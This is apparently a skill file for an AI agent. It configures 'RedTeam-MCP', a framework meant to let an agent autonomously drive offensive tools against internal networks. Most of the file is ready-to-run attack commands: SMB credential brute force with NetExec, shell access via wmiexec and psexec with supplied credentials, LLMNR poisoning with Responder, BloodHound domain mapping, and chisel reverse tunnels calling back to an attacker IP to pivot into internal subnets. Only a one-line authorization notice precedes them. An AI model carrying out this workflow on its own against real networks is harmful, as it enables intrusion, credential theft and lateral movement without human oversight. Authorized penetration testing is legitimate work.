---
name: redteam-mcp
description: RedTeam-MCP - AI-powered red team framework via Model Context Protocol. 15+ tools (gogo, fscan, nxc, impacket, BloodHound). Use for autonomous internal network penetration, AD attacks, lateral movement.
---

> ⚠️ **SECURITY NOTICE**: Only use on systems you own or have explicit written authorization for. Unauthorized access is illegal.

# RedTeam-MCP

AI-powered autonomous red team framework via Model Context Protocol. Lets AI agents directly control 15+ security tools for internal network pentesting.

## When to Activate

- "scan internal network", "find Windows hosts"
- "pivot through network", "lateral movement"
- "AD attack", "BloodHound", "Kerberoast"
- "MCP server pentest", "AI agent red team"
- "wmiexec", "psexec", "NetExec"
- CTF: "automated pentest", "autonomous agent"

## Core Concepts

### Architecture

```
[AI Agent] <--MCP--> [redteam-server] <--tools--> [Target Network]
                              |
                    gogo, fscan, nxc, httpx,
                    nuclei, impacket, chisel...
```

### Tool Matrix

| Category | Tool | Function |
|----------|------|----------|
| Discovery | gogo | Fast asset discovery |
| Scanning | fscan | Comprehensive network scanner |
| Web | httpx | Web fingerprinting |
| Scanner | nuclei | Vulnerability scanning |
| Creds | nxc (NetExec) | SMB/WinRM/SSH |
| Lateral | wmiexec | WMI execution |
| Lateral | psexec | PSEXEC execution |
| AD | BloodHound | AD relationship mapping |
| AD | Responder | LLMNR spoofing |
| Tunnel | chisel | HTTP reverse tunnel |

## Workflow

### Step 1: Local Installation

**Already installed at:**
```
/home/anini39/.config/opencode/tools/RedTeam-MCP/
```

**Dependencies installed in:**
```
/home/anini39/.config/opencode/tools/RedTeam-MCP/redteam-server/.venv/
```

### Step 2: Usage

```bash
# Activate venv and run tools directly
cd /home/anini39/.config/opencode/tools/RedTeam-MCP/redteam-server
source .venv/bin/activate

# Or use full paths:
/home/anini39/.config/opencode/tools/RedTeam-MCP/redteam-server/.venv/bin/python <tool>.py
```

### Step 3: Available Tools

```json
{
  "mcpServers": {
    "RedTeam-MCP": {
      "command": "/path/to/venv/bin/python",
      "args": ["/path/to/redteam-server/main.py"]
    }
  }
}
```

### Step 3: AI Agent Commands

Tell your AI agent:
```
Scan 192.168.1.0/24, find all Windows hosts and identify open services
```

### Step 4: Analysis Phase

```
Find all SMB servers with SMB signing disabled
```

### Step 5: Lateral Movement

```
Use wmiexec to connect to 192.168.1.100 with admin:password
```

### Step 6: Post-Exploitation

```
Run BloodHound to map AD relationships
```

## Tool Usage Examples

### Network Discovery

```bash
# Direct tool usage
invoke_gogo -t 100 -iL hosts.txt
# Fast asset discovery on subnet
invoke_gogo -t 192.168.1.0/24
```

### Port Scanning

```bash
# Quick scan
invoke_fscan -h 192.168.1.0/24
# Full scan with service detection
invoke_nmap -h 192.168.1.100 -p- -sV
```

### Credential Attacks

```bash
# SMB brute force
invoke_nxc smb 192.168.1.0/24 -u admin -p password.txt
# WinRM check
invoke_nxc winrm 192.168.1.100 -u user -p pass
```

### Lateral Movement

```bash
# WMI exec
invoke_wmiexec -target 192.168.1.100 -domain WORKGROUP -username admin -password password
# PSEXEC
invoke_psexec -target 192.168.1.100 -username admin -password password -exec-method wmi
```

### AD Attacks

```bash
# BloodHound collector (run on domain joined machine)
invoke_bloodhound -c ALL -d domain.local -dc dc.domain.local
# Responder (LLMNR/NBT-NS poisoning)
invoke_responder -I eth0 -dwv
```

### Tunneling

```bash
# Chisel reverse tunnel
invoke_chisel server -p 8080 --reverse
# Then on target:
./chisel client YOUR_IP:8080 R:0.0.0.0:80:127.0.0.1:80
```

## Automation Examples

### Full Pentest Loop

```
1. Recon: gogo discovers live hosts
2. Scan: fscan/nmap identifies services  
3. Enum: nxc checks SMB, WinRM, SSH
4. Exploit: wmiexec/psexec gains shell
5. Pivot: chisel creates tunnel
6. AD: BloodHound + Responder for domain
```

### Pivot Through Router

```bash
# 1. From compromised W10, pivot through router
invoke_chisel client MAIN_ROUTER_IP:8080 R:127.0.0.1:445:INTERNAL_SMB:445

# 2. Now access internal network from your machine
nmap -sT -p445 INTERNAL_SMB_IP
```

## Installation Quick Ref

```bash
# Windows (PowerShell)
git clone https://github.com/ktol1/RedTeam-MCP.git
cd RedTeam-MCP\redteam-server
python -m venv venv
.\venv\Scripts\activate
pip install -r requirements.txt

# Linux
git clone https://github.com/ktol1/RedTeam-MCP.git
cd RedTeam-MCP/redteam-server
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

## Validation Checklist

- [ ] MCP server starts without errors
- [ ] AI agent can invoke tools
- [ ] gogo discovers hosts on target subnet
- [ ] nxc authenticates to SMB
- [ ] wmiexec gets shell on Windows
- [ ] chisel tunnel establishes
- [ ] Can reach internal subnets through pivot
